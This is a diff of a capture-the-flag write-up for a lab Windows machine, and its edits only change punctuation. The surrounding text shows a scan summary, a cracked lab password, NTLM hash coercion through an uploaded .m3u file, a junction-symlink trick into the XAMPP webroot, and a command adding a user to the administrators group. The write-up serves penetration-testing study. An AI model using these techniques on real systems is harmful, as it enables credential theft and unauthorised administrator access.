@@ -35,7 +35,7 @@ PORT     STATE SERVICE       VERSION
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
-Three ports: SSH, HTTP on Apache/XAMPP, and RDP. No domain - `WORKGROUP: MEDIA`, straight workgroup machine. Port 80 is what matters.
+Three ports: SSH, HTTP on Apache/XAMPP, and RDP. No domain, `WORKGROUP: MEDIA`, straight workgroup machine. Port 80 is what matters.
 
 ## NTLM Coerce via .m3u
 
@@ -86,7 +86,7 @@ RDP         10.129.234.67   3389   MEDIA            [*] Windows 10 or Windows Se
 RDP         10.129.234.67   3389   MEDIA            [+] MEDIA\enox:1234virus@
 ```
 
-RDP didn't cooperate on my end - probably a client issue, not the server. SSH worked fine:
+RDP didn't cooperate on my end, probably a client issue, not the server. SSH worked fine:
 
 ```bash
 Microsoft Windows [Version 10.0.20348.4052]
@@ -95,11 +95,11 @@ Microsoft Windows [Version 10.0.20348.4052]
 enox@MEDIA C:\Users\enox>
 ```
 
-User flag. The `review.ps1` sitting in enox's Documents was the script processing the uploads - the same one that sent back enox's hash.
+User flag. The `review.ps1` sitting in enox's Documents was the script processing the uploads, the same one that sent back enox's hash.
 
 ## Privilege Escalation: Junction Symlink into XAMPP Webroot
 
-Enumerating the system, two things stand out. First, no other user accounts - just `enox` and `Administrator`. Second, XAMPP is installed at `C:\xampp`:
+Enumerating the system, two things stand out. First, no other user accounts, just `enox` and `Administrator`. Second, XAMPP is installed at `C:\xampp`:
 
 ```bash
 Directory of C:\
@@ -118,7 +118,7 @@ Directory of C:\
 upload destination = C:\Windows\Tasks\Uploads\md5(firstName + lastName + email)
 ```
 
-The MD5 is computed from the concatenated form values. It's predictable - you control all three inputs. If you submit `kanyo`, `kanyo`, `kanyo@me`, the upload directory becomes `md5("kanyokanyokanyo@me")` = `12c11b14d917e8d8fb03881e5929ff74`.
+The MD5 is computed from the concatenated form values. It's predictable. You control all three inputs. If you submit `kanyo`, `kanyo`, `kanyo@me`, the upload directory becomes `md5("kanyokanyokanyo@me")` = `12c11b14d917e8d8fb03881e5929ff74`.
 
 Here's the exploit: Windows NTFS junctions are directory symlinks. When you create a junction at a path and something writes a file into that path, the file lands inside the junction's target instead. The server creates the upload folder if it doesn't exist, but if a junction is already there, writing into it writes into the target directory.
 
@@ -205,7 +205,7 @@ C:\Windows\Tasks\Uploads\tcb.exe "cmd /c net localgroup administrators enox /add
 [+] Service deleted successfully.
 ```
 
-The error message is expected - the command ran but the short-lived service process doesn't stick around to report success. Log out and back in as enox for the group membership to refresh:
+The error message is expected. The command ran but the short-lived service process doesn't stick around to report success. Log out and back in as enox for the group membership to refresh:
 
 ```bash
 enox@MEDIA C:\Users\enox>whoami /groups
@@ -223,4 +223,4 @@ BUILTIN\Users
 
 Administrator access. Root flag.
 
-The NTLM coerce via .m3u is the thing I'd remember from this box. The moment you see "compatible with Windows Media Player" on a file upload form, that's the attack surface. It shows up anywhere a Windows service processes media files server-side - backup software, transcoding pipelines, media management tools. The WMP automatic authentication behavior is a feature, not a bug, which is why it's so reliable.
+The NTLM coerce via .m3u is the thing I'd remember from this box. The moment you see "compatible with Windows Media Player" on a file upload form, that's the attack surface. It shows up anywhere a Windows service processes media files server-side, backup software, transcoding pipelines, media management tools. The WMP automatic authentication behavior is a feature, not a bug, which is why it's so reliable.
